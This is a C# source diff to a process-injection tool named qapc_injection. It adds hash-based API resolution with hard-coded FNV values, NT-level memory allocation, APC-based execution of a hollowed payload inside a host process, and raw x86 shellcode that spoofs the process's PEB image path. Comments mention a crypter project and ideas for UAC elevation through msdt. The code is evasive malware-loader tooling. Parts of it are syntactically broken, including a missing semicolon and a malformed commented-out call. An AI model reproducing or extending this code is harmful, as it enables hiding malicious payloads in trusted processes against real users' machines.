@@ -1,7 +1,9 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
+using System.Text;
 
 namespace qapc_injection
 {
@@ -518,9 +520,19 @@ namespace qapc_injection
                                     uint nSize,
                                     ref uint lpNumberOfBytesWritten);
 
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        private delegate bool t_WriteProcessMemory2(
+                                    IntPtr hProcess,
+                                    IntPtr lpBaseAddress,
+                                    IntPtr lpBuffer,
+                                    uint nSize,
+                                    IntPtr lpNumberOfBytesWritten);
+
         #endregion  
 
         private static t_WriteProcessMemory WriteProcessMemory;
+        private static t_WriteProcessMemory2 WriteProcessMemory2;
 
         #endregion
 
@@ -641,6 +653,57 @@ namespace qapc_injection
 
         #endregion
 
+        #region NtQueueApcThread
+
+        #region Definition
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        private delegate int t_NtQueueApcThread(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData, IntPtr opt2, IntPtr opt3);
+
+        #endregion
+
+        private static t_NtQueueApcThread NtQueueApcThread;
+
+        #endregion
+
+        #region KiUserApcDispatcher
+
+        #region Definition
+
+        private delegate void t_KiUserApcDispatcher(IntPtr a, IntPtr b, IntPtr c, IntPtr ContextStart, IntPtr ContextBody);
+
+        #endregion
+
+        private static t_KiUserApcDispatcher KiUserApcDispatcher;
+
+        #endregion
+
+        #region NtAlertResumeThread
+
+        #region Definition
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        private delegate int t_NtAlertResumeThread(IntPtr ThreadHandle, ref ulong SuspendCount);
+
+        #endregion
+
+        private static t_NtAlertResumeThread NtAlertResumeThread;
+
+        #endregion
+
+        #region NtAllocateVirtualMemory
+
+        #region Definition
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        private delegate int t_NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, uint ZeroBits, ref uint RegionSize, uint AllocationType, uint Protect);
+
+        #endregion  
+
+        private static t_NtAllocateVirtualMemory NtAllocateVirtualMemory;
+
+        #endregion
+
         private static T LoadFunction<T>(IntPtr lpModuleBase, uint dwFunctionHash)
         {
             IntPtr lpFunction = GetProcAddress(lpModuleBase, dwFunctionHash);
@@ -656,18 +719,26 @@ namespace qapc_injection
             IntPtr lpKernel32 = GetKernel32BaseAddress();
             IntPtr lpNtdll = GetNtdllBaseAddress();
 
-            CreateProcessW = LoadFunction<t_CreateProcessW>(lpKernel32, FNVHash("CreateProcessW"));
-            GetThreadContext = LoadFunction<t_GetThreadContext>(lpKernel32, FNVHash("GetThreadContext"));
-            ReadProcessMemory = LoadFunction<t_ReadProcessMemory>(lpKernel32, FNVHash("ReadProcessMemory"));
-            NtUnmapViewOfSection = LoadFunction<t_NtUnmapViewOfSection>(lpNtdll, FNVHash("NtUnmapViewOfSection"));
-            VirtualAllocEx = LoadFunction<t_VirtualAllocEx>(lpKernel32, FNVHash("VirtualAllocEx"));
-            VirtualProtectEx = LoadFunction<t_VirtualProtectEx>(lpKernel32, FNVHash("VirtualProtectEx"));
-            VirtualQueryEx = LoadFunction<t_VirtualQueryEx>(lpKernel32, FNVHash("VirtualQueryEx"));
-            VirtualFreeEx = LoadFunction<t_VirtualFreeEx>(lpKernel32, FNVHash("VirtualFreeEx"));
-            WriteProcessMemory = LoadFunction<t_WriteProcessMemory>(lpKernel32, FNVHash("WriteProcessMemory"));
-            SetThreadContext = LoadFunction<t_SetThreadContext>(lpKernel32, FNVHash("SetThreadContext"));
-            ResumeThread = LoadFunction<t_ResumeThread>(lpKernel32, FNVHash("ResumeThread"));
-            QueueUserAPC = LoadFunction<t_QueueUserAPC>(lpKernel32, FNVHash("QueueUserAPC"));
+            // kernel32 functions
+            CreateProcessW = LoadFunction<t_CreateProcessW>(lpKernel32, 0xA0F20974);
+            GetThreadContext = LoadFunction<t_GetThreadContext>(lpKernel32, 0xCF0067E3);
+            ReadProcessMemory = LoadFunction<t_ReadProcessMemory>(lpKernel32, 0x3301084);
+            NtUnmapViewOfSection = LoadFunction<t_NtUnmapViewOfSection>(lpNtdll, 0x424ED548);
+            VirtualAllocEx = LoadFunction<t_VirtualAllocEx>(lpKernel32, 0x99B37A95);
+            VirtualProtectEx = LoadFunction<t_VirtualProtectEx>(lpKernel32, 0x687D2F5B);
+            VirtualQueryEx = LoadFunction<t_VirtualQueryEx>(lpKernel32, 0x92F50AF2);
+            VirtualFreeEx = LoadFunction<t_VirtualFreeEx>(lpKernel32, 0x33A84D20);
+            WriteProcessMemory = LoadFunction<t_WriteProcessMemory>(lpKernel32, 0x8C1E9A9B);
+            WriteProcessMemory2 = LoadFunction<t_WriteProcessMemory2>(lpKernel32, 0x8C1E9A9B);
+            SetThreadContext = LoadFunction<t_SetThreadContext>(lpKernel32, 0xEE430B5F);
+            ResumeThread = LoadFunction<t_ResumeThread>(lpKernel32, 0x6426F5F3);
+            QueueUserAPC = LoadFunction<t_QueueUserAPC>(lpKernel32, 0x7D81A082);
+
+            // ntdll functions
+            NtQueueApcThread = LoadFunction<t_NtQueueApcThread>(lpNtdll, 0x22FA0B1F);
+            NtAlertResumeThread = LoadFunction<t_NtAlertResumeThread>(lpNtdll, 0x4E44E6F7);
+            NtAllocateVirtualMemory = LoadFunction<t_NtAllocateVirtualMemory>(lpNtdll, 0x3F47E8B);
+            KiUserApcDispatcher = LoadFunction<t_KiUserApcDispatcher>(lpNtdll, 0x55D46ECE);
         }
 
         [DllImport("Kernel32.dll")]
@@ -906,6 +977,15 @@ namespace qapc_injection
             public uint ImageSize;
         }
 
+        [StructLayout(LayoutKind.Sequential)]
+        private struct UNICODE_STRING
+        {
+            public ushort Length;
+            public ushort MaximumLength;
+            private IntPtr buffer;
+        }
+
+
         private static bool InitHostProcess(string pszFormattedPath, ref HostProcessInfo HPI)
         {
             bool bResult;
@@ -936,12 +1016,35 @@ namespace qapc_injection
             CONTEXT CTX = new CONTEXT();
             CTX.ContextFlags = (uint)CONTEXT_FLAGS.CONTEXT_ALL;
 
+            // YOU Dont actually need getthreadcontext ->??? you just need peb->Imagebaseaddress
             bResult = GetThreadContext(HPI.PI.hThread, ref CTX);
 
             if (!bResult)
                 return false;
 
             HPI.CTX = CTX;
+
+            // patch the peb fields in  _RTL_USER_PROCESS_PARAMETERS +0x010 
+            // +0x038 ImagePathName    : _UNICODE_STRING
+            // +0x040 CommandLine      : _UNICODE_STRING? do u need to patch this or is created with CreateProcessW?
+            IntPtr pPEB = (IntPtr)CTX.Ebx;
+
+            //string _unformattedQuotedPath = pszFormattedPath.Trim('"');
+
+            //{
+            //    /* init unicode string in foreign process */
+            //    uint __out = 0;
+            //    int len = _unformattedQuotedPath.Length * 2;
+            //    int maxlen = len + 2;
+            //    IntPtr lpForeignImagePathName = VirtualAllocEx(HPI.PI.hProcess, IntPtr.Zero, (uint)maxlen, 0x3000, 0x40);
+            //    byte[] pBb = new UnicodeEncoding().GetBytes(_unformattedQuotedPath);
+            //    WriteProcessMemory(HPI.PI.hProcess, lpForeignImagePathName, pBb, (uint)pBb.Length, ref __out);
+
+            //    /* update the field */
+            //    IntPtr _rtl_user_proc_params = ReadProcessMemory(HPI(IntPtr)((uint)pPEB + 0x010);
+            //    IntPtr _image_Path_name = (IntPtr)((uint)_rtl_user_proc_params + 0x038);
+
+            //}
 
             // read peb
             byte[] _readBuffer = new byte[sizeof(uint)];
@@ -978,6 +1081,52 @@ namespace qapc_injection
             HPI.ImageSize = (uint)lpCurrentAddress - HPI.ImageBase;
 
             return bResult;
+        }
+
+        private static bool AllocateImageSpace(HostProcessInfo HPI, ref IntPtr newImageBase, uint dwImageBase, uint dwSizeOfImage)
+        {
+            // attempt to allocate space at the target imagebase (5 times, in case of any NtAllocateVirtualMemory Fails?? , or is this only with VirtualAllocEX...?
+
+            int NT_STAT = -1;
+            int dwAttempts = 0;
+
+            IntPtr lpAllocBaseAddress = (IntPtr)dwImageBase;
+            uint dwRegionSize = dwSizeOfImage;
+
+            while (dwAttempts < 5)
+            {
+                NT_STAT = NtAllocateVirtualMemory(HPI.PI.hProcess, ref lpAllocBaseAddress, 0, ref dwRegionSize, 0x3000, 0x40);
+
+                if (NT_STAT == 0 /* yes, i know NT_SUCCESS is not this: but it _should_ not return anything else but 0x00)*/)
+                    break;
+
+                dwAttempts++;
+            }
+
+            // if we failed to allocate at imagebase, try to allocate it at some random point in process memory...
+            if (NT_STAT != 0)
+            {
+                dwAttempts = 0;
+                lpAllocBaseAddress = (IntPtr)dwImageBase;
+                dwRegionSize = dwSizeOfImage;
+
+                while (dwAttempts < 5)
+                {
+                    NT_STAT = NtAllocateVirtualMemory(HPI.PI.hProcess, ref lpAllocBaseAddress, 0, ref dwRegionSize, 0x3000, 0x40);
+
+                    if (NT_STAT == 0)
+                        break;
+
+                    dwAttempts++;
+                }
+
+                if (NT_STAT != 0)
+                    return false;
+            }
+
+            newImageBase = lpAllocBaseAddress;
+
+            return true;
         }
 
         private static bool Run2(byte[] lpExe, string pszApplicationPath, string pszCmdLine = default(string))
@@ -1032,6 +1181,8 @@ namespace qapc_injection
             VirtualFreeEx(HPI.PI.hProcess,
                  (IntPtr)HPI.ImageBase, HPI.ImageSize, 0x8000);
 
+            //NtUnmapViewOfSection(HPI.PI.hProcess, HPI.ImageBase);
+
             //int NtStatus = NtUnmapViewOfSection(HPI.PI.hProcess, HPI.ImageBase);
             bResult = true; //NtStatus == 0 ? true : false;
 
@@ -1039,14 +1190,35 @@ namespace qapc_injection
                 return false;
 
             // allocate memory for the payload in payload's original imagebase
-            v = VirtualAllocEx(
-                        HPI.PI.hProcess,
-                        (IntPtr)pINH.OptionalHeader.ImageBase,
-                        pINH.OptionalHeader.SizeOfImage,
-                        0x3000,
-                        0x40);
+            //v = VirtualAllocEx(
+            //            HPI.PI.hProcess,
+            //            (IntPtr)pINH.OptionalHeader.ImageBase,
+            //            pINH.OptionalHeader.SizeOfImage,
+            //            0x3000,
+            //            0x40);
 
-            bResult = v != IntPtr.Zero; //don't need ternarys when using comparison operators, js
+            //int dwAttempts = 0;
+
+            //while (dwAttempts < 5)
+            //{
+            //    IntPtr lpAllocBaseAddress = (IntPtr)pINH.OptionalHeader.ImageBase;
+            //    uint dwAllocRegionSize = pINH.OptionalHeader.SizeOfImage;
+
+            //    int ret = NtAllocateVirtualMemory(HPI.PI.hProcess, ref lpAllocBaseAddress, 0, ref dwAllocRegionSize, 0x3000, 0x40);
+            //    v = lpAllocBaseAddress;
+            //}
+
+            //IntPtr lpAllocBaseAddress = (IntPtr)pINH.OptionalHeader.ImageBase;
+            //uint dwAllocRegionSize = pINH.OptionalHeader.SizeOfImage;
+
+            //int ret = NtAllocateVirtualMemory(HPI.PI.hProcess, ref lpAllocBaseAddress, 0, ref dwAllocRegionSize, 0x3000, 0x40);
+            //v = lpAllocBaseAddress;
+
+            IntPtr newV = IntPtr.Zero;
+            bResult = AllocateImageSpace(HPI, ref newV, pINH.OptionalHeader.ImageBase, pINH.OptionalHeader.SizeOfImage);
+            //  Debugger.Break();
+
+            v = newV; //don't need ternarys when using comparison operators, js
 
             //if (v != (IntPtr)pINH.OptionalHeader.ImageBase)
             //    Debugger.Break();
@@ -1063,6 +1235,7 @@ namespace qapc_injection
             if ((uint)v == 0)
             {
                 // could try relocating peb if it has relocation table ?
+                // allocate at random place?
             }
 
             // patch peb->ImageBaseAddress
@@ -1081,7 +1254,7 @@ namespace qapc_injection
             if (!bResult)
                 return false;
 
-            // patch Nt->ImageBase in payload exe
+            // patch Nt->ImageBase in payload exe QWORD <-> DWORD
             pINH.OptionalHeader.ImageBase = (uint)v;
 
             // copy the payload headers
@@ -1106,7 +1279,7 @@ namespace qapc_injection
 
                 fixed (byte* lpModuleBase = &lpExe[0])
                 {
-                    uint e_lfanew = *(lpModuleBase + 0x3c);
+                    uint e_lfanew = *(uint*)(lpModuleBase + 0x3c);
                     byte* ishBase = lpModuleBase + e_lfanew + 0xF8 + (i * 0x28);
                     VirtualAddress = *(uint*)(ishBase + 0xc);
                     SizeOfRawData = *(uint*)(ishBase + 0x10);
@@ -1116,6 +1289,9 @@ namespace qapc_injection
                 byte[] lpBuffer = new byte[SizeOfRawData];
                 Buffer.BlockCopy(lpExe, (int)PointerToRawData, lpBuffer, 0, (int)SizeOfRawData);
 
+                if (SizeOfRawData == 0) /* virtual section */
+                    continue;
+
                 bResult = WriteProcessMemory(
                                     HPI.PI.hProcess,
                                     (IntPtr)((uint)v + VirtualAddress),
@@ -1123,7 +1299,7 @@ namespace qapc_injection
                                     SizeOfRawData,
                                     ref dwNumberOfBytesWritten);
 
-                bResult = (bResult && dwNumberOfBytesWritten == SizeOfRawData) ? true : false;
+                bResult = (bResult && dwNumberOfBytesWritten == SizeOfRawData);
 
                 if (!bResult)
                     return false;
@@ -1134,12 +1310,21 @@ namespace qapc_injection
             else
                 HPI.CTX.Eax = (uint)v + pINH.OptionalHeader.AddressOfEntryPoint;
 
-            bResult = SetThreadContext(HPI.PI.hThread, ref HPI.CTX);
+            //bResult = SetThreadContext(HPI.PI.hThread, ref HPI.CTX);
 
-            if (!bResult)
-                return false;
+            //if (!bResult)
+            //    return false;
 
-            ResumeThread(HPI.PI.hThread);
+            // QueueUserAPC((IntPtr)HPI.CTX.Eax, HPI.PI.hThread, IntPtr.Zero);
+
+            HPI.CTX.Eax = (IntPtr)ChangePEBPath(HPI.PI.hProcess,"")
+
+            NtQueueApcThread(HPI.PI.hThread, (IntPtr)HPI.CTX.Eax, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+
+            ulong suspend = 0;
+            NtAlertResumeThread(HPI.PI.hThread, ref suspend);
+
+            //   ResumeThread(HPI.PI.hThread);
 
             return bResult;
         }
@@ -1192,33 +1377,113 @@ namespace qapc_injection
             ResumeThread(pi.hThread);
         }
 
+        [DllImport("shell32.dll")]
+        public static extern bool SHGetSpecialFolderPath(IntPtr hwndOwner, [Out]StringBuilder lpszPath, int nFolder, bool fCreate);
+
+        private static string GetSystemDirectory()
+        {
+            StringBuilder path = new StringBuilder(260);
+            SHGetSpecialFolderPath(IntPtr.Zero, path, 0x0029, false);
+            return path.ToString();
+        }
+
+        private static List<IntPtr> func(string procName)
+        {
+            List<IntPtr> procHandles = new List<IntPtr>();
+
+            foreach (Process proc in Process.GetProcessesByName(procName))
+            {
+                if (proc.ProcessName == procName)
+                    procHandles.Add(/* proc.Handle */  proc.MainModule.BaseAddress);
+            }
+
+            return procHandles;
+        }
+
+
         public static void Main(string[] args)
         {
             InitAPI();
 
             string pszProcessName = Path.Combine(
-                                  Environment.GetFolderPath(Environment.SpecialFolder.System),
-                                  "svchost.exe");
+                                 GetSystemDirectory(),
+                                  "calc.exe");
+
+            string bintextPath = "C:\\Users\\Admin\\Desktop\\bintext.exe";
+            //  string nativePath = Path.Combine(GetSystemDirectory(), "msdt.exe");
+
+            //inject msdt.exe -> target process
+            // that prompts UAC -> yes elevated process (svchost.exe )
+            // 
 
 
-            byte[] lpFileBuffer = File.ReadAllBytes("C:\\Users\\Admin\\Desktop\\bintext.exe");
-            byte[] lpDllBuffer = File.ReadAllBytes(@"C:\Users\admin\Desktop\managed-crypter\managedcrypter\2inj\bin\Release\2inj.dll");
+            // so like it' sjust less sketchy, but it doesnt matter cuz it's just msdt :|
+            // idk why it injects like that trusted prompt comes up
+            // but if you could like alter the flow of execution to start our own process then that would elevate it
+            // I actually was thinking of something for escalation using named pipes and file handles
+            // let me show you 1 sec
 
+            byte[] lpFileBuffer = File.ReadAllBytes(bintextPath);
 
-            InjectDll(lpDllBuffer);
-            // Run2(lpFileBuffer, pszProcessName);
+            Run2(lpFileBuffer, pszProcessName);
         }
 
-        private static void RunExecRoutine(byte[] lpExe, string pszApplicationPath, string pszCmdLine = default(string))
+        public static IntPtr ChangePEBPath(IntPtr hProcess, string newPath)
         {
-            bool bRet = false;
-            for (int i = 0; i < 5; i++)
+            byte[] shellcode = {
+            0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x40, 0x0C,
+            0x8B, 0x48, 0x1C, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x10,
+            0x64, 0x8B, 0x1D, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x5B, 0x0C, 0x8B, 0x5B,
+            0x0C, 0x83, 0xC3, 0x24, 0x83, 0xC0, 0x38, 0x66, 0xBA, 0xFF, 0xFF, 0x66,
+            0x89, 0x10, 0x66, 0x89, 0x13, 0x66, 0x83, 0xC2, 0x02, 0x66, 0x89, 0x50,
+            0x02, 0x66, 0x89, 0x53, 0x02, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0x89, 0x50,
+            0x04, 0x89, 0x53, 0x04, 0x51, 0xC3
+        };
+
+            IntPtr pRemoteBuffer = IntPtr.Zero;
+            IntPtr pRemoteString = IntPtr.Zero;
+
+            byte[] strBytes = Encoding.Unicode.GetBytes(newPath + "\0");
+
+            pRemoteString = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)strBytes.Length, 0x3000, 0x40);
+
+            if (pRemoteString != IntPtr.Zero)
             {
-                bRet = Run2(lpExe, pszApplicationPath, pszCmdLine);
-                if (bRet)
-                    break;
+                IntPtr pLocalString = Marshal.AllocHGlobal(strBytes.Length);
+                Marshal.Copy(strBytes, 0, pLocalString, strBytes.Length);
+
+                WriteProcessMemory2(hProcess, pRemoteString, pLocalString, (uint)strBytes.Length, IntPtr.Zero);
+
+                Marshal.FreeHGlobal(pLocalString);
+
+                Array.Copy(BitConverter.GetBytes(strBytes.Length - 2), 0, shellcode, 0x2D, 2);
+                Array.Copy(BitConverter.GetBytes(pRemoteString.ToInt32()), 0, shellcode, 0x42, 4);
+
+                pRemoteBuffer = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
+
+                if (pRemoteBuffer != IntPtr.Zero)
+                {
+                    IntPtr pLocalBuffer = Marshal.AllocHGlobal(shellcode.Length);
+                    Marshal.Copy(shellcode, 0, pLocalBuffer, shellcode.Length);
+
+                    WriteProcessMemory2(hProcess, pRemoteBuffer, pLocalBuffer, (uint)shellcode.Length, IntPtr.Zero);
+
+                    Marshal.FreeHGlobal(pLocalBuffer);
+                }
             }
+
+            return pRemoteBuffer;
         }
+
+        //        The return value will be a pointer in the remote processes memory to the shellcode payload.To make it execute when the process is resumed, set CONTEXT.eax to this value.
+
+        //        An example of this would be:
+
+        //*(uint*)(ctx + 0xB0 /* eax */) = (uint)ChangePEBPath((IntPtr)PROCESS_INFO[0], "G:\\fakepath.exe");
+
+        //OR
+
+        //ctx.eax = (IntPtr)ChangePEBPath(hProcess, "G:\\fakepath.exe");
 
         private static uint FNVHash(string str)
         {
